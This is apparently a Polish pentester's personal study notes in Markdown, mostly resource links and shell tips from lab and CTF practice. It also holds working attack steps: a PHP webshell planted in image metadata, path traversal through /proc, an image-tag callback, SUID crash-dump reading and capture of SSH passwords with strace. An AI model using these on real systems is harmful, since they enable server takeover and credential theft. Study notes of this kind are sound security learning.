- [HACKER/PENTESTER ROADMAP](#hackerpentester-roadmap)
- [SUPER NOTATKI](#super-notatki)
	- [lists for hackers, pentesters \& security researchers (lista ciekawych repozytoriów)](#lists-for-hackers-pentesters--security-researchers-lista-ciekawych-repozytoriów)
	- [collection of awesome penetration testing resources, tools and other shiny things](#collection-of-awesome-penetration-testing-resources-tools-and-other-shiny-things)
	- [czyjeś notatki - dobrej jakości](#czyjeś-notatki---dobrej-jakości)
	- [Tips for Penetration Testing (czerstwe)](#tips-for-penetration-testing-czerstwe)
	- [payloads and bypasses for Web Application Security](#payloads-and-bypasses-for-web-application-security)
	- [hacking trick/technique/whatever ... have learnt in CTFs](#hacking-tricktechniquewhatever--have-learnt-in-ctfs)
		- [Typical workflow for the pentesting of a machine](#typical-workflow-for-the-pentesting-of-a-machine)
	- [Auto\_Wordlists (IPs of trusted DNS servers, web fuzzing/discovery lists)](#auto_wordlists-ips-of-trusted-dns-servers-web-fuzzingdiscovery-lists)
	- [OWASP](#owasp)
		- [Web Security Testing Guide (WSTG)](#web-security-testing-guide-wstg)
		- [Mobile Application Security Testing Guide (MASTG)](#mobile-application-security-testing-guide-mastg)
		- [Cheat Sheet Series - good security practices for builders in order to secure their applications](#cheat-sheet-series---good-security-practices-for-builders-in-order-to-secure-their-applications)
	- [Linux Privilege Escalation](#linux-privilege-escalation)
		- [LPE Basics](#lpe-basics)
		- [Checklist](#checklist)
	- [exploity na binarkach unix](#exploity-na-binarkach-unix)
	- [Windows Privilege Escalation](#windows-privilege-escalation)
	- [różne payloady też wytłumaczone](#różne-payloady-też-wytłumaczone)
	- [A curated list of VULNERABLE APPS and SYSTEMS (PENETRATION TESTING PRACTICE LAB)](#a-curated-list-of-vulnerable-apps-and-systems-penetration-testing-practice-lab)
	- [Lab PortSwigger](#lab-portswigger)
	- [XSS-PAYLOADS](#xss-payloads)
- [TRICKI](#tricki)
	- [Ręczne hakowanie stron internetowych](#ręczne-hakowanie-stron-internetowych)
	- [Lista użytecznych payloadów i innych do atakowania stron internetowych](#lista-użytecznych-payloadów-i-innych-do-atakowania-stron-internetowych)
	- [pspy](#pspy)
	- [linpeas](#linpeas)
	- [seclist](#seclist)
	- [OWASP vulnerable apps](#owasp-vulnerable-apps)
	- [wyszykiwanie linków na stronie](#wyszykiwanie-linków-na-stronie)
	- [PYTHON](#python)
	- [nikto](#nikto)
	- [malicious code in image](#malicious-code-in-image)
	- [czytanie wszystkich plików w poszukiwaniau wyrażenia](#czytanie-wszystkich-plików-w-poszukiwaniau-wyrażenia)
	- [ustawienie wartości jakiejś zmiennej dla procesu/komendy](#ustawienie-wartości-jakiejś-zmiennej-dla-procesukomendy)
		- [dla kilku komend](#dla-kilku-komend)
	- [przejęcie shella bez zmiany PID](#przejęcie-shella-bez-zmiany-pid)
	- [usuń puste foldery](#usuń-puste-foldery)
	- [przenieś wszytkie pliki z danym rozszerzeniem do jednego folderu](#przenieś-wszytkie-pliki-z-danym-rozszerzeniem-do-jednego-folderu)
	- [znajdź duplikaty plików używając md5](#znajdź-duplikaty-plików-używając-md5)
	- [zamień spacje z nazw plików na \_ (pliki i foldery)](#zamień-spacje-z-nazw-plików-na-_-pliki-i-foldery)
	- [cała (bezwzględna) ścieżka do pliku](#cała-bezwzględna-ścieżka-do-pliku)
	- [OCR](#ocr)
	- [PDF](#pdf)
	- [shodan](#shodan)
	- [recon-ng](#recon-ng)
	- [wykonywanie skryptu (np. pythona ze ścieżki $PATH, ROZWINĄĆ)](#wykonywanie-skryptu-np-pythona-ze-ścieżki-path-rozwinąć)
- [TOKEN JWT](#token-jwt)
- [znajdź pliki z ustawionym SUID](#znajdź-pliki-z-ustawionym-suid)
- [Dump Crash aplikacji](#dump-crash-aplikacji)
- [znalezienie miejsca interakcji usera i strony php](#znalezienie-miejsca-interakcji-usera-i-strony-php)
- [dump bazy danych](#dump-bazy-danych)
- [mySQL](#mysql)
- [CANARY TOKEN](#canary-token)
- [dodanie dodatkowego adresu ip do interfejsu](#dodanie-dodatkowego-adresu-ip-do-interfejsu)
- [Null-byte injection](#null-byte-injection)
- [PHP Webshell używając obrazu](#php-webshell-używając-obrazu)
- [system plików /proc](#system-plików-proc)
- [skaner procesów wykorzystujący /proc](#skaner-procesów-wykorzystujący-proc)
- [Instalacja debugera .NET .dll w kali](#instalacja-debugera-net-dll-w-kali)
- [Przechwycenie hasła ssh](#przechwycenie-hasła-ssh)

# HACKER/PENTESTER ROADMAP
https://github.com/sundowndev/hacker-roadmap

# SUPER NOTATKI
## lists for hackers, pentesters & security researchers (lista ciekawych repozytoriów)
https://github.com/Hack-with-Github/Awesome-Hacking
## collection of awesome penetration testing resources, tools and other shiny things 
https://github.com/enaqx/awesome-pentest

## czyjeś notatki - dobrej jakości
https://0xffsec.com/handbook/
## Tips for Penetration Testing (czerstwe)
https://github.com/ahmetgurel/Pentest-Hints
## payloads and bypasses for Web Application Security
[STRONA](https://swisskyrepo.github.io/PayloadsAllTheThingsWeb/)

https://github.com/swisskyrepo/PayloadsAllTheThings

## hacking trick/technique/whatever ... have learnt in CTFs
page where you will find each hacking trick/technique/whatever I have learnt in CTFs, real life apps, and reading researches and news.
https://book.hacktricks.xyz/welcome/readme / [GitHub](https://github.com/carlospolop/hacktricks)

### [Typical workflow for the pentesting of a machine](https://github.com/carlospolop/hacktricks/blob/master/generic-methodologies-and-resources/pentesting-methodology.md)

## Auto_Wordlists (IPs of trusted DNS servers, web fuzzing/discovery lists)
https://github.com/carlospolop/Auto_Wordlists

## [OWASP](https://github.com/OWASP)

### Web Security Testing Guide (WSTG)
guide to testing the security of web applications and web services
- [github repo](https://github.com/OWASP/wstg) / [strona internetowa](https://owasp.org/www-project-web-security-testing-guide/)
	- https://github.com/OWASP/wstg/tree/master/checklists - checklisty co sprawdzić, 
	- [wersja z dopisanymi narzędziami- OTG (github innego usera)](https://github.com/tanprathan/OWASP-Testing-Checklist)

### Mobile Application Security Testing Guide (MASTG)
manual for mobile app security testing and reverse engineering.
https://github.com/OWASP/owasp-mastg

### Cheat Sheet Series - good security practices for builders in order to secure their applications
https://github.com/OWASP/CheatSheetSeries

interesujące foldery: cheatsheets, cheatsheets_draft, cheatsheets_excluded
## Linux Privilege Escalation
### LPE Basics
https://github.com/RoqueNight/Linux-Privilege-Escalation-Basics
### Checklist
https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist
## exploity na binarkach unix
https://gtfobins.github.io/
## Windows Privilege Escalation
https://github.com/RoqueNight/Windows-Privilege-Escalation-Basics
## różne payloady też wytłumaczone
https://github.com/payloadbox
## A curated list of VULNERABLE APPS and SYSTEMS (PENETRATION TESTING PRACTICE LAB)
https://github.com/kaiiyer/awesome-vulnerable

## Lab PortSwigger
https://portswigger.net/web-security/learning-path

## XSS-PAYLOADS
Lista payloadów XSS
http://www.xss-payloads.com/

# TRICKI

## Ręczne hakowanie stron internetowych
* czy ktoś obserwuje jakiś formularz i kliknie, czy obraz będzie pobierany?
ustawić listener na porcie 80: nc -lvp 80
	* < img src="http://IP_MOJEGO_SERWERA:PORT/test"> </ img>
	* < img src="http://IP_MOJEGO_SERWERA:PORT/test"> </ img>
* Czy to serwer PHP?
	* http://adres/**index.php**
* Jeśli to serwer ww to sprawdzić co jest na nim postawione
	* cd /var/www -zawiera foldey domenowe zawierające pliki dla każdej z hostowanych stron (DOMENY)
		* folder root dla strony to /var/www/<nazwa_domeny>/public_html, zawiera index.html (str główna), root jest deklarowany w pliku *conf* w folderze * /etc/apache2/sites-available*
	* /etc/apache2/sites-available -zawiera pliki konfiguracyjne vhost (każdy to inna DOMENA) 
	* /etc/apache2/sites-enabled -włączone (widoczne, możliwe do wyświetlenia) strony, symbolic link do jakiegoś pliku z folderu *sites-available*
	* źródło: https://linuxize.com/post/how-to-set-up-apache-virtual-hosts-on-ubuntu-20-04/#creating-a-virtual-hosts

Subdomena nie musi kierować do tego samego serwera, jest to sposób na zapewnienie użytkownikowi spójnego nazewnictwa, np.: ftp.nazwa.com, mail.nazwa.com mogą prowadzić do różnych serwerów, np.:
www.nazwa.com -normal web site
hr.nazwa.com -portal dla hr

## Lista użytecznych payloadów i innych do atakowania stron internetowych
https://github.com/swisskyrepo/PayloadsAllTheThings
## [pspy](https://github.com/DominicBreuker/pspy)
skrypt pozwalający podglądać procesy bez uprawnień roota
```bash
#pobrać, wysłać na atakowany komputer,  
chmod +x,  
./pspy
```
## [linpeas](https://github.com/carlospolop/PEASS-ng)
skaner możliwośći eskalacji uprawnień

## [seclist](https://github.com/danielmiessler/SecLists)  
zbiór wielu typów list wykorzystywanych podczas oceny bezpieczeństwa, zgromadzone w jednym miejscu  
https://www.kali.org/tools/seclists/

## OWASP vulnerable apps
aplikacje do ćwiczenia

https://owasp.org/www-project-vulnerable-web-applications-directory/

## wyszykiwanie linków na stronie
```
curl http://link/ --silent | grep -Eo "href=\"[^\"]*\"" | sort | uniq
curl --silent http://link | grep -Eo "[a-zA-Z]*=\"[^\"]*\"" | sort | uniq
```

## PYTHON
```python
os.path.join(os.getcwd(), "public", "uploads", el)
```

 If a component (el) is an absolute path (np.: (//?) /daniel), all previous components are thrown away and joining continues from the absolute path component.
 
 ## nikto
 Scan web server for known vulnerabilities
 ```
 nikto -host http://192.168.2.47/dvwa
```
 analizuje aplikację- adres pod kątem możliwych wektorów ataku
 ## malicious code in image
 https://rcenetsec.com/hide-malicious-shell-in-image-file/
 
 
 ## czytanie wszystkich plików w poszukiwaniau wyrażenia 
 ```
 grep -R wyrażenie / 2> /dev/null
 grep -nri xxx 2> /dev/null
```
/ root folder
-R recurse subdirectories, following symlinks 
-n prefix output with line numbers
-r recurse subdirectories
-i case-insensitive 

## ustawienie wartości jakiejś zmiennej dla procesu/komendy
https://stackoverflow.com/questions/10856129/setting-an-environment-variable-before-a-command-in-bash-is-not-working-for-the/10856348#10856348  
export FOO=bar  
somecommand someargs

https://unix.stackexchange.com/questions/126938/why-is-setting-a-variable-before-a-command-legal-in-bash  
FOO=bar somecommand someargs
### dla kilku komend
FOO=bar bash -c 'somecommand someargs | somecommand2'
używając sudo należy pamięctać o -E aby przekazywało zmienne do dalszych poleceń
 
 ## przejęcie shella bez zmiany PID
 ```
 exec /bin/sh
 ```
 ## usuń puste foldery
``` 
find . -type d -empty -delete
```
 ## przenieś wszytkie pliki z danym rozszerzeniem do jednego folderu
```
find . -name "*.zip" -exec mv "{}" ./zipfiles \;
```
## znajdź duplikaty plików używając md5
```
find . -type f -print0 | xargs -0 md5sum | sort | uniq -w32 --all-repeated=separate
```

## zamień spacje z nazw plików na _ (pliki i foldery)
```
REKURSYWNIE
for f in *\ *; do mv "$f" "${f// /_}"; done
INNE REKURSYWNIE
find . -type f -name "* *" -exec bash -c 'mv "$0" "${0// /_}"' {} \; #https://linuxconfig.org/remove-white-space-from-file-name-and-rename-it-with-bash-command
```
The ${f// /_} part utilizes bash's parameter expansion mechanism to replace a pattern within a parameter with supplied string. The relevant syntax is ${parameter/pattern/string}. See: https://www.gnu.org/software/bash/manual/html_node/Shell-Parameter-Expansion.html or http://wiki.bash-hackers.org/syntax/pe .

## cała (bezwzględna) ścieżka do pliku
```
find "$(pwd)" -type f
```

## OCR
ważna jest dobra jakość tekstu na obrazkach
https://ocrmypdf.readthedocs.io/en/latest/cookbook.html
```
# OCR obrazków, tekst do pliku  
$ for i in * ; do tesseract $i outtext_$1;  done;
# OCR PDF
$ ocrmypdf --redo-ocr scalone_ocr.pdf scalone_ocr.pdf
# wszystkie pliki w folderze to tylko pdfy
$ for f in *;do ocrmypdf --redo-ocr $f $f;done 
```

## PDF
```
# jeśli jest błąd "Unimplemented Feature: Could not merge encrypted files" to należy odszyfrować pliki
for file in $(find $(pwd) -type f -name *.pdf| sort);do qpdf --decrypt "$file" --replace-input;done
```
scalanie pdf
```
pdfunite pdf1.pdf pdf2.pdf ... nazwa_wynikowego_pdf.pdf
```
scalanie obrazów w pdf
```
for f in *;do echo $f;done # sprawdzić czy są w odpowiedniej kolejności
convert *.png merged.pdf # wszystkie pdf z folderu scal do merged.pdf, czasem trzeba coś zmienić https://stackoverflow.com/questions/52998331/imagemagick-security-policy-pdf-blocking-conversion
```



## shodan
port:21 -otwarte porty = 21 (ftp), 5000  
nasa.gov -pokaż servery związane z NASA  
product: apache

## recon-ng
full-featured reconnaissance framework designed with the goal of providing a powerful environment to conduct open source web-based reconnaissance quickly and thoroughly
https://github.com/lanmaster53/recon-ng/wiki
https://www.kali.org/tools/recon-ng/

## wykonywanie skryptu (np. pythona ze ścieżki $PATH, ROZWINĄĆ)
```bash
#!/bin/bash
path/to/python/env /path/to/script.py "$@"
## lub
python3 /path/to/script.py "$@"

```

```bash
#!/usr/bin/env sh
set -e
cd /usr/share/responder/
exec ./Responder.py "$@"
```

# TOKEN JWT
[jwt.io](https://jwt.io/)
pozwala rozszyfrować tokeny JWT

# znajdź pliki z ustawionym SUID
```bash
find . -perm /4000 # pliki z ustawionym SUID
find . -perm /2000 # pliki z ustawionym GUID
find . -perm /6000 # pliki z ustawionym SUID i GUID
```

# Dump Crash aplikacji
pozwala odczytać stan aplikacji porzed crashem
np: jeśli ma ustawiony SUID i robi coś z plikiem to można odczytać zawartość pliku
```bash
dasith@secret:/opt$ ls -la
	-rwsr-xr-x  1 root root 17824 Oct  7  2021 count
dasith@secret:/opt$ ./count #program zaczyna działać
dasith@secret:/tmp/daniel$ ps -ef | grep count
	dasith     36095   35847  0 12:44 pts/2    00:00:00 ./count
dasith@secret:/tmp/daniel$ kill -11 36095
dasith@secret:/tmp/daniel$ cd /var/crash # tu znajdują się raporty z crashu aplikacji
dasith@secret:/var/crash$ ls -l
	-rw-r----- 1 dasith dasith 29108 Sep 15 12:41 _opt_count.1000.crash

#rozpakowanie raportu na czytelniejszy
dasith@secret:/var/crash$ apport-unpack <report> <target directory>
```

# znalezienie miejsca interakcji usera i strony php
```bash
┌──(kck㉿kck)-[~/…/notatki/HTB/previse/site_files]
└─$ grep "\$_" * | grep -v "SERVER" | grep -v "SESSION"
# "$_ " gdzie jest coś z requesta co ma wziąć kod
# nie szukaj nic ze słowmai SERVER i SESSION
accounts.php:            if (empty(trim($_POST['username']))) {
accounts.php:            } elseif (empty(trim($_POST['password']))) {
accounts.php:            } elseif (empty(trim($_POST['confirm']))) {
accounts.php:                if (!preg_match('/^[a-zA-Z0-9_]+$/', trim($_POST['username']))) {
accounts.php:                    $username = filter_var($_POST['username'], FILTER_SANITIZE_STRING);
accounts.php:                    $password = $_POST['password'];
accounts.php:                    $confirm = filter_var($_POST['confirm'], FILTER_SANITIZE_STRING);
download.php:if (isset($_GET['file'])) {
download.php:    if (!filter_var($_GET['file'], FILTER_VALIDATE_INT)) {
download.php:        $fileId = filter_var($_GET['file'], FILTER_SANITIZE_NUMBER_INT);
files.php:                if (count($_FILES) > 0) {
files.php:                    if (is_uploaded_file($_FILES['userData']['tmp_name'])) {
files.php:                        $fileName = $_FILES['userData']['name'];
files.php:                        $fileData = addslashes(file_get_contents($_FILES['userData']['tmp_name']));
files.php:                        $fileSize = $_FILES['userData']['size'];
files.php:        $delID = filter_var($_POST['del'], FILTER_SANITIZE_NUMBER_INT);
login.php:            $username = filter_var($_POST['username'], FILTER_SANITIZE_STRING);
login.php:            $password = $_POST['password'];
login.php:            } elseif (empty(trim($_POST['password']))) {
logs.php:$output = exec("/usr/bin/python /opt/scripts/log_process.py {$_POST['delim']}");
```

# dump bazy danych 
https://stackoverflow.com/questions/19838369/how-to-download-mysql-database-from-server-using-command-prompt-in-windows
```bash
mysqldump -p -u username database_name > dbname.sql
```
# mySQL
```bash
show databases;
use <baza>;
show tables;
describe <nazwa_tabeli>;
```

# CANARY TOKEN
W momencie ich użycia - generowany jest automatyczny alert, który ma poinformować nas o potencjalnym wycieku.  
https://security.szurek.pl/co-to-sa-canary-tokens/

# dodanie dodatkowego adresu ip do interfejsu
https://ostechnix.com/how-to-assign-multiple-ip-addresses-to-single-network-card-in-linux/

# Null-byte injection
https://www.thehacker.recipes/web/inputs/null-byte-injection
Null byte is a bypass technique for sending data that would be filtered otherwise. It relies on injecting the null byte characters (%00, \x00) in the supplied data. Its role is to terminate a string.

# PHP Webshell używając obrazu
https://yolospacehacker.com/hackersguide/toolbox.php?id=imgwebshell

https://github.com/F1uffyGoat/php-cmd-exec-webshell/blob/master/exiftool%20code
```bash
# dodaje webshell do atrybutu DocumentName obrazu image.jpg
# webshell to /usr/share/webshells/php/simple-backdoor.php 
exiftool -DocumentName="<h1>KuceK<br><?php if(isset(\$_REQUEST['cmd'])){echo '<pre>';\$cmd = (\$_REQUEST['cmd']);system(\$cmd);echo '</pre>';} __halt_compiler();?></h1>" image.jpg

# zmiana rozszerzenia żeby został wykonany przez silnik php
mv image.jpg image.php

#upload pliku na webserwer

# wykorzystanie webshella
https://atakowany_serwer.com/image.php?cmd=id
```
# system plików /proc
informacje na temat procesu, przydatne podczas LFI / Directory Trawersal  
`/proc/[ID] dla siebie to /proc/self`   
https://docs.kernel.org/filesystems/proc.html  
https://tldp.org/LDP/Linux-Filesystem-Hierarchy/html/proc.html

```bash
/proc/self/...

clear_refs
cmdline
cpu
cwd
environ
exe
fd
maps
mem
root
stat
statm
status
wchan
pagemap
stack
smaps
smaps_rollup
numa_maps
```
# skaner procesów wykorzystujący /proc
```bash
for i in $(seq 900 1000); do response=$(curl -s "10.10.11.201:8000/?page=../../../../proc/$i/cmdline");echo "$response  PID => $i";done

for i in $(seq 900 1000); do curl 10.10.11.201:8000/?page=../../../../proc/$i/cmdline -o -; echo "  PID => $i"; done

for i in $(seq 900 1000); do
  response=$(curl -s "10.10.11.201:8000/?page=../../../../proc/$i/cmdline")
  if ! echo "$response" | grep -q "File not found"; then
    echo "$response  PID => $i"
  fi
done
```

# Instalacja debugera .NET .dll w kali
najlepiej zrobić to w maszynie wirtualnej żeby sobie systemu nie zaśmiecać
INSTALACJA ILSPY 
https://www.matbra.com/2020/06/18/install-avalonia-ilspy.html

# Przechwycenie hasła ssh
https://eapolsniper.github.io/2020/08/22/SSH-Password-Theft/
https://medium.com/@deboj88/spaying-on-ssh-password-using-strace-7465ede0a5cc
będąc na maszynie do której ktoś będzie się łączył
```bash
# trace system calls and signals
strace # śledzi zapytania systemowe do danego procesu

ps # znalezienie wszytskich procesów związanych z sshd
strace -p <PID SSHD> -f -o outfile.txt
# -p proces 
# -f --follow-forks - Trace child processes as they are created by currently traced processes as a result of the fork(2), vfork(2) and clone(2) system calls.  Note that -p PID -f will attach all threads of process PID if it is multi-threaded, not only thread with thread_id = PID.

cat out.txt| grep "<... read resumed>" # szukać w tym

```


